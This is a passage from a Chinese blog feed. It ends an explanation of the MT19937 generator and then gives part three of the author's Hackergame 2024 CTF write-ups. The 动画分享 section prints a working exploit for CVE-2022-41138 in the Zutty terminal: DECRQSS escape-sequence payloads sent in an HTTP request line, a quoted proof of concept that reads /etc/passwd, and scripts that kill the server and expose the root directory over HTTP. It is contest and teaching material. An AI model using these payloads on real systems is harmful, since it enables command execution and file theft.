punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>N<span class="token punctuation">]</span> <span class="token operator">&amp;</span> self<span class="token punctuation">.</span>LOWER_MASK<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> y <span class="token operator">>></span> <span class="token number">1</span>    <span class="token keyword">if</span> y <span class="token operator">&amp;</span> <span class="token number">0x1</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> self<span class="token punctuation">.</span>MATRIX_A    self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> self<span class="token punctuation">.</span>M<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>N<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传入的参数<code>i</code>即为当前的下标<code>_mti</code>。我们发现，每次旋转只会影响当前下标的状态向量：<code>_mt[i]</code>，对其他位置的状态向量没有任何影响。但影响当前下标状态向量的元素则有3个：</p><ul><li><code>_mt[i]</code></li><li><code>_mt[i+1]</code></li><li><code>_mt[i+397]</code></li></ul><p>相对于自身的偏移量分别为0、1、397。这是一个有用的性质。方便起见，下面将<code>_mt[i+k]</code>称为$x_{i+k}$</p><p>旋转过程如下：</p><ol><li>首先取出 <script type="math/tex">x_{i}</script> 的最高位与 <script type="math/tex">x_{i+1}</script> 的低31位，组合为一个新的变量 $y$</li><li>将$y$右移一位（抹掉最后一位）</li><li>如果$y$在上一步被抹掉的那个数位是1（可理解为 $x_{i+1}$ 是个奇数）则将其与<code>MATRIX_A</code>异或</li><li>将上一步得到的值与 $x_{i+397}$​ 进行异或，赋值给 $x_i$</li></ol><h3 id="Tempering"><a href="#Tempering" class="headerlink" title="Tempering"></a>Tempering</h3><p>上一步得到新的$x_i$后，对其进行下面的操作：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">tempering</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    y <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span>    y <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x9d2c5680</span>    y <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xefc60000</span>    y <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">18</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进行了一些简单的移位、与运算，得到最终的32bit伪随机数。</p><h3 id="完整的提取过程"><a href="#完整的提取过程" class="headerlink" title="完整的提取过程"></a>完整的提取过程</h3><p>在Python的实现中，并非每一次提取都会进行一次旋转，而是当下标计数器达到$N=624$后，进行连续624次旋转，然后把下标计数器清零。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">extract_number</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>_mti <span class="token operator">>=</span> self<span class="token punctuation">.</span>N<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>twist<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_mti <span class="token operator">=</span> <span class="token number">0</span>    y <span class="token operator">=</span> self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>self<span class="token punctuation">.</span>_mti<span class="token punctuation">]</span>    y <span class="token operator">=</span> self<span class="token punctuation">.</span>tempering<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>_mti <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> _int32<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这相当于一次性把整个状态数组生成好了，容易证明其效果与每次提取时进行一次旋转相同，不过在这两种不同的处理方式下，进行对状态数组的相关处理时需要注意到区别，例如在使用<code>setstate</code>方法时。</p><hr><p>以上，即是MT19937算法的实现细节，根据这些细节，我们就能对其进行逆向，逆向的内容我将会放到<a href="/blog/12283/">后面一篇文章</a>中。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="学习笔记" scheme="https://blog.fyz666.xyz/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="密码学" scheme="https://blog.fyz666.xyz/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="PRNG" scheme="https://blog.fyz666.xyz/tags/prng/"/>
    
    <category term="MT19937" scheme="https://blog.fyz666.xyz/tags/mt19937/"/>
    
  </entry>
  
  <entry>
    <title>Hackergame 2024 题解（三）</title>
    <link href="https://blog.fyz666.xyz/blog/12196/"/>
    <id>https://blog.fyz666.xyz/blog/12196/</id>
    <published>2024-11-09T05:10:29.000Z</published>
    <updated>2025-08-14T08:53:41.567Z</updated>
    
    <content type="html"><![CDATA[<p>本文是Hackergame 2024 题解的第三部分。</p><h2 id="动画分享"><a href="#动画分享" class="headerlink" title="动画分享"></a>动画分享</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>为了给同学分享动画片，小 T 启动了自己之前用超安全的 Rust 语言写的 Web server，允许你访问「当前目录」的文件，当然了，flag 可不在当前目录。不过因为快到饭点了，小 T 还没来得及复制视频文件到对应的目录，于是就只在自己最常使用的、<strong>几年前编译的某<del>祖传</del>终端模拟器</strong>里面跑起了自己的 <code>fileserver</code>，然后就去锁屏吃饭了。</p><p>小 T：「诶，我不过就分享个文件，而且目录里面也没别的东西，所以没关系吧～而且我特地搞了个 chroot，就算我真写出了什么漏洞，你也休想看到我的 flag！」</p><p>请提交一个程序，题目环境会在模拟小 T 的环境运行之后，降权运行你的程序：</p><ul><li>如果你能让小 T 的 <code>fileserver</code> 无法正常响应请求（例如让 <code>fileserver</code> 退出），你可以获得第一小题的 flag。</li><li>第二小题的 flag 在 <code>/flag2</code>，你需要想办法得到这个文件的内容。</li></ul><p>环境限制总 PID 数为 64。</p><p><a href="https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E5%8A%A8%E7%94%BB%E5%88%86%E4%BA%AB/files/%E5%8A%A8%E7%94%BB%E5%88%86%E4%BA%AB.zip">本题附件</a></p></div></div></details><p>这道题是我觉得最有意思的题之一 <del>（别的大佬觉得有意思的题我不会）</del> 这也是我第一次利用现查的CVE去解题。</p><h3 id="只要不停下-HTTP-服务，响应就会不断延伸"><a href="#只要不停下-HTTP-服务，响应就会不断延伸" class="headerlink" title="只要不停下 HTTP 服务，响应就会不断延伸"></a>只要不停下 HTTP 服务，响应就会不断延伸</h3><p>我们要让小 T 的<code>fileserver</code>无法正常处理请求，即让下面函数返回<code>False</code>:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">health_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2.0</span><span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        request <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"GET / HTTP/1.1\r\nConnection: close\r\n\r\n"</span></span>        sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>request<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8192</span><span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token comment"># print(f"Error: &#123;e&#125;")</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们看到<code>fileserver</code>的源代码：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span></span>fs<span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>io<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span><span class="token class-name">Read</span><span class="token punctuation">,</span> <span class="token class-name">Write</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>net<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span><span class="token class-name">TcpListener</span><span class="token punctuation">,</span> <span class="token class-name">TcpStream</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>path<span class="token punctuation">::</span></span><span class="token class-name">Path</span><span class="token punctuation">;</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token namespace">std<span class="token punctuation">::</span>io<span class="token punctuation">::</span></span><span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> address <span class="token operator">=</span> <span class="token string">"127.0.0.1:8000"</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> listener <span class="token operator">=</span> <span class="token class-name">TcpListener</span><span class="token punctuation">::</span><span class="token function">bind</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Serving HTTP on &#123;&#125;"</span><span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> stream <span class="token keyword">in</span> listener<span class="token punctuation">.</span><span class="token function">incoming</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">match</span> stream <span class="token punctuation">&#123;</span>            <span class="token class-name">Ok</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token function">handle_connection</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">Err</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token macro property">eprintln!</span><span class="token punctuation">(</span><span class="token string">"Connection failed: &#123;&#125;"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">fn</span> <span class="token function-definition function">handle_connection</span><span class="token punctuation">(</span><span class="token keyword">mut</span> stream<span class="token punctuation">:</span> <span class="token class-name">TcpStream</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> buffer <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">match</span> stream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> buffer<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Ok</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> request <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">from_utf8_lossy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">[</span><span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Received request: &#123;&#125;"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">lines</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap_or</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到这里就够了！后面的代码就是很常规的处理HTTP请求。</p><p>为什么会注意到这个<code>println!</code>函数呢？这还得感谢出题人在题目中的暗示：<strong>几年前编译的某<del>祖传</del>终端模拟器</strong>。</p><p>我在注意到这条暗示之前，尝试了很多其他的方法，例如想通过同时发起一大堆HTTP请求把服务器搞崩之类的，不过统统不奏效。后面才看到了这个暗示，于是我看了一下附件给的其他文件，比如下面这个<code>Dockerfile</code>：</p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token comment"># Uncomment "RUN echo"s, then do this locally for testing:</span><span class="token comment"># docker build -t local/anime .</span><span class="token comment"># cat &lt;YOUR_PAYLOAD> | base64 --wrap=0 | docker run --rm --tmpfs /dev/shm:exec --tmpfs /tmp -i local/anime</span><span class="token instruction"><span class="token keyword">FROM</span> ustclug/debian:bullseye <span class="token keyword">AS</span> builder</span><span class="token instruction"><span class="token keyword">RUN</span> apt update &amp;&amp; apt install -y git build-essential python3-dev pkg-config libfreetype-dev libxmu-dev libgles2-mesa-dev &amp;&amp; <span class="token operator">\</span>    git clone https://git.hq.sig7.se/zutty.git &amp;&amp; cd zutty &amp;&amp; git checkout 0.12 &amp;&amp; <span class="token operator">\</span>    ./waf configure &amp;&amp; ./waf</span><span class="token instruction"><span class="token keyword">FROM</span> ustclug/debian:bullseye</span><span class="token instruction"><span class="token keyword">RUN</span> apt update &amp;&amp; apt install -y python3 xvfb libfreetype6 libxmu6 libgles2-mesa libegl1 netcat-openbsd curl</span><span class="token instruction"><span class="token keyword">COPY</span> <span class="token options"><span class="token property">--from</span><span class="token punctuation">=</span><span class="token string">builder</span></span> /zutty/build/src/zutty /usr/local/bin/zutty</span><span class="token comment"># Start it once to create shader cache</span><span class="token instruction"><span class="token keyword">RUN</span> timeout -s 9 5 xvfb-run /usr/local/bin/zutty || true</span><span class="token instruction"><span class="token keyword">COPY</span> src/fileserver /usr/local/bin/fileserver</span><span class="token comment"># Start fileserver automatically in zutty :)</span><span class="token instruction"><span class="token keyword">RUN</span> echo <span class="token string">"cd /root/chroot/ &amp;&amp; chroot /root/chroot/ fileserver"</span> > /root/.bashrc &amp;&amp; <span class="token operator">\</span>    mkdir /root/chroot &amp;&amp; cp -r /lib* /root/chroot/ &amp;&amp; mkdir -p /root/chroot/usr/ /root/chroot/usr/bin/ /root/chroot/usr/local/bin/ &amp;&amp; <span class="token operator">\</span>    cp -r /usr/lib* /root/chroot/usr/ &amp;&amp; cp -r /usr/bin/* /root/chroot/usr/bin/ &amp;&amp; cp -r /usr/local/bin/* /root/chroot/usr/local/bin/</span><span class="token instruction"><span class="token keyword">COPY</span> src/ /src/</span><span class="token comment"># Note that you cannot just "cat /flag1" directly on server :)</span><span class="token comment"># RUN echo "Submit your program to get real flag1 on server!" > /flag1 &amp;&amp; \</span><span class="token comment">#     echo "Submit your program to get real flag2 on server!" > /flag2</span><span class="token instruction"><span class="token keyword">CMD</span> [<span class="token string">"python3"</span>, <span class="token string">"-u"</span>, <span class="token string">"/src/server.py"</span>]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到题目里说的终端模拟器是指<code>zutty</code>，版本为<code>0.12</code>，立刻去查相关的CVE，查到了<a href="https://nvd.nist.gov/vuln/detail/CVE-2022-41138">这个链接</a>。</p><blockquote><p>In Zutty before 0.13, DECRQSS in text written to the terminal can achieve arbitrary code execution.</p></blockquote><p>是说如果我们能任意控制打印到<code>zutty</code>终端上的内容的话，就可以通过一个叫<code>DECRQSS</code>的东西执行任意命令。而这东西是个啥呢？查了一下发现还挺复杂，不过好在刚刚那个网页给了一个有用的<a href="https://bugs.gentoo.org/868495">链接</a>，这个链接则给了一个利用此CVE的payload，以及<code>zutty</code>修复这个CVE的patch：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/bb300cf1-25f4-44a3-add7-ae52849bcba8.png" alt="image-20241109191608825" style="zoom:50%;" /></p><p>这个<code>poc.txt</code>的内容如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'poc.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token string">b'\x1bP$q\ncat /etc/passwd\n\x1b\\\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>也就是说我们可以试图去构造类似于这种样子的payload，让服务端打印出这样的东西，就能执行一些命令了。</p><p>搞懂了这些以后，就知道我们需要注意服务端源代码的这一行：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Received request: &#123;&#125;"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">lines</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap_or</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>它会把我们发起的请求的第一行打到屏幕上，注意是<strong>第一行</strong>，这也意味着，如果按前面的payload那样在中间插入一些换行符<code>\n</code>，就达不到同样的效果，好在我们还可以用<code>\r</code>代替<code>\n</code>，所以我们可以把payload改成：</p><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">b&#39;\x1bP$q\r???\r\x1b\\\n&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不过<code>???</code>处要填什么东西可以让服务退出呢？我一开始一直在想有什么让服务退出的命令，结果发过去发现一个都不能运行起来。后来才意识到，文件服务阻塞了终端，你命令能运行就怪了。</p><p>然后我想到平时我们自己在终端上让服务停下来，好像一般都是按<kbd>Ctrl</kbd> + <kbd>C</kbd>。查了一下发现这个组合键其实是向终端发送了一个<code>\x03</code>。</p><p>于是：</p><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">b&#39;\x1bP$q\r\x03\r\x1b\\\n&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以拿到flag1了。</p><p>最终的解题代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> socketpayload <span class="token operator">=</span> <span class="token string">b'\x1bP$q\r\x03\r\x1b\\'</span><span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="希望的终端模拟器，连接着我们的羁绊"><a href="#希望的终端模拟器，连接着我们的羁绊" class="headerlink" title="希望的终端模拟器，连接着我们的羁绊"></a>希望的终端模拟器，连接着我们的羁绊</h3><p>这一问，我们需要拿到位于服务器根目录的flag2。</p><p>很自然想法是，我们现在相当于可以在终端上执行任意命令了，只是看不到终端的输出内容。</p><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">b&#39;\x1bP$q\r\x03\r???\r\x1b\\\n&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在<code>???</code>处插入任意的命令，应该都可以执行，并且不存在<code>chroot</code>限制。</p><p>一开始的想法是，我通过一个操作把<code>/flag2</code>搬到当前目录，然后重新把<code>fileserver</code>启动起来，再向<code>flieserver</code>发起一个<code>GET /flag2</code>，就行了。结果试了好久才发现这个当前目录居然是只读的。于是这道题卡了小半天。</p><p>到了晚上突然想起，我为什么非得用他提供的文件服务呢？我不是还有<code>Python</code>？</p><p>于是写出下面payload：</p><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">b&#39;\x1bP$q\r\x03\rpython3 -m http.server 8080 --directory &#x2F;\r\x1b\\&#39;,<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以把他的服务干掉以后开一个<code>Python</code>的文件服务器，而且可以指定根目录为当前目录。</p><p>最终的脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> time<span class="token keyword">import</span> repayloads <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">b'\x1bP$q\r\x03\rpython3 -m http.server 8080 --directory /\r\x1b\\'</span><span class="token punctuation">,</span>    <span class="token string">b'GET /flag2\r\n\r\n'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>        s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        response <span class="token operator">=</span> <span class="token string">b""</span>        <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>                <span class="token keyword">break</span>            response <span class="token operator">+=</span> data        <span class="token keyword">return</span> response<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">,</span> payloads<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>flag2 <span class="token operator">=</span> request<span class="token punctuation">(</span><span class="token number">8080</span><span class="token punctuation">,</span> payloads<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'flag\&#123;.*&#125;'</span><span class="token punctuation">,</span> flag2<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用此脚本可以一次拿俩flag。</p><h2 id="关灯"><a href="#关灯" class="headerlink" title="关灯"></a>关灯</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>3D 版本的关灯游戏。</p><p>注：解决这道题不需要很多计算资源，一般的笔记本电脑都是可以完成任务的。最后一问传输数据量较大而且时限很短，为了避免网速的影响，使用了多阶段的题目下载与答案上传机制。</p><p><a href="https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E5%85%B3%E7%81%AF/files/lights_out.py">题目源代码</a></p></div></div></details><h3 id="Easy-amp-Medium-amp-Hard"><a href="#Easy-amp-Medium-amp-Hard" class="headerlink" title="Easy &amp; Medium &amp; Hard"></a>Easy &amp; Medium &amp; Hard</h3><p>前三问送分，直接用<code>z3</code>：</p><p><a href="https://gist.github.com/windshadow233/55180c5e648be86f5ffcb950968e6f24">解题代码</a></p><p>第四问复杂度炸了，估计得用什么方法优化，没怎么研究。</p><h2 id="禁止内卷"><a href="#禁止内卷" class="headerlink" title="禁止内卷"></a>禁止内卷</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>（以下剧情均为虚构，请助教和学生都不要模仿！）</p><p>XXX 课程实验一内容：</p><blockquote><p>本实验需要使用给定的用户评论预测用户对书籍、电影和动画的评分。</p><p>…………（部分省略）</p><p>我们提供来自诸如某瓣、某某艺、某字母站、某某米等网站的一部分用户评论和评分数据作为训练集，你需要使用这些数据训练模型，来预测对于另一部分给定的评论（测试集），用户会打出怎样的给分。测试集只提供评论数据，不提供评分。用户评分均归一化到 0 到 100 分的整数。</p><p>对于我们给定的 50000 项的测试集，本实验要求提交对这些测试集你的模型的输出结果，以 JSON 列表的格式输出，列表中每一项是一个 0 到 100 的整数。</p><p>特别地，为了鼓励同学们互相 PK，我们特别开设了评分网站，提供<strong>前 500 项</strong>的数据测试。诸位可以在做实验的时候提交自己的结果，直接看到自己距离预期分数的平方差，更有榜单功能。</p><p>实验 DDL：…………（部分省略）</p></blockquote><p>但是这周的实验和作业实在是太多了，太多了，太多了。而且和你同班的有至少 114 个卷王。你刷新着榜单网站，看到榜一越来越小的平方差，陷入了绝望。</p><p>不过你的舍友好像之前说他帮这门课助教写了个啥东西（没有加分），好像就是这个网站。你私聊问他要到了源代码，白盒审计的时候发现了不得了的事情……你发现，你不仅可以拿到答案，而且可以搞点破坏，让各位卷王不要再卷了！</p><p>本题的 flag 位于评分数据<strong>原始 JSON 文件</strong>的列表头部，将对应的数字加 65 后使用 ASCII 编码转换后即为 flag 文本。</p><p><a 